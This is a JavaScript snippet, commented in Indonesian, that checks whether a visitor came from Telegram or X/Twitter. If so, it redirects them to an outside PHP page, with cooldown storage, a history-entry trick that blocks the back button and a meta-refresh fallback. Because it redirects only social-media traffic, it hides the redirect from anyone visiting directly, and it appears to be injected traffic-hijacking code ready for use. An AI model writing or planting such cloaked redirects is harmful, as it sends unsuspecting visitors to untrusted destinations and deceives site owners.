(function () {
  try {
    // ==== ATUR INI SAJA ====
    var target = "https://vidoy.fun/cB6Tyq0.php"; // TUJUAN (HTTPS)
    var cooldownMs = 5 * 1000;                    // 60 detik (ubah sesuai kebutuhan)
    // =======================

    if (!/^https:\/\//i.test(target)) return;

    // Bypass manual: ?noredir=1 atau #noredir
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(location.search + location.hash)) return;

    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");

    // Telegram sering nol referrer → andalkan UA.
    // Tambahkan X juga, sekalian.
    var fromTele = /(telegram|telegram-android|tgapp|tweb|t\.me|telegram\.org)/i.test(UA) || /(t\.me|telegram\.org)/i.test(REF);
    var fromX    = /(twitter)/i.test(UA) || /(t\.co|twitter\.com)/i.test(REF);
    var allowed  = fromTele || fromX;
    if (!allowed) return;

    // Anti-loop per TAB dan lintas kunjungan
    var page = location.origin + location.pathname; // konsisten, abaikan query
    var sessKey = "redir_seen:" + page + "|" + target;
    var cdKey   = "redir_cd:" + page + "|" + target;

    // Cek sessionStorage
    if (sessionStorage.getItem(sessKey)) return;

    // Cek localStorage cooldown
    var now = Date.now();
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    // Cadangan: cek cookie cooldown kalau localStorage bermasalah
    var cookieUntil = (function () {
      try {
        var m = document.cookie.match(/(?:^|;\s*)redir_cd_until=([^;]+)/);
        return m ? parseInt(decodeURIComponent(m[1]) || "0", 10) : 0;
      } catch (_) { return 0; }
    })();
    if (cookieUntil && now < cookieUntil) return;

    // Lock lebih dulu supaya reload balik tidak retrigger
    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));
    try {
      // cookie cadangan  (kedaluwarsa = now+cooldown)
      var exp = new Date(now + cooldownMs).toUTCString();
      document.cookie = "redir_cd_until=" + encodeURIComponent(String(now + cooldownMs)) + "; path=/; expires=" + exp + "; SameSite=Lax";
    } catch (_) {}

    // Bantalan history supaya saat balik dari target, tab tidak "hilang"
    try { history.pushState({ hold: 1 }, "", location.href); } catch (_) {}

    // Beberapa WebView lebih “ramah” kalau redirect dilakukan setelah tick pendek
    setTimeout(function () {
      try { location.href = target; } catch (_) {}
    }, 50);

    // Last resort (jarang perlu): meta refresh kalau JS ditahan
    setTimeout(function () {
      try {
        if (!document.getElementById("__rdmeta__")) {
          var m = document.createElement("meta");
          m.httpEquiv = "refresh";
          m.content = "0;url=" + target;
          m.id = "__rdmeta__";
          document.head.appendChild(m);
        }
      } catch (_) {}
    }, 400);

  } catch (_) {}
})();
